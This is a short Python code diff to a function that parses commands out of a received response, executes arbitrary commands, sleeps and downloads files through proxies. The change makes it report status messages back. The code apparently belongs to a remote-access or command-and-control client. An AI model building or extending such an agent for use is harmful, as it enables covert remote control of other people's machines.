@@ -50,9 +50,10 @@ def parse(response, proxies):
     ex = ' '.join(commands[1:])
     return execute(ex)
   if commands[0] == "sleep":
-    return time.sleep(int(commands[1]))
+    time.sleep(int(commands[1]))
+    return "slept for "+str(commands[1])+"\n"
   if commands[0] == "download":
-    return download(commands[1], proxies)
+    return "saved to "+str(download(commands[1], proxies))+"\n"
   else: return 0
 
 def execute(command):
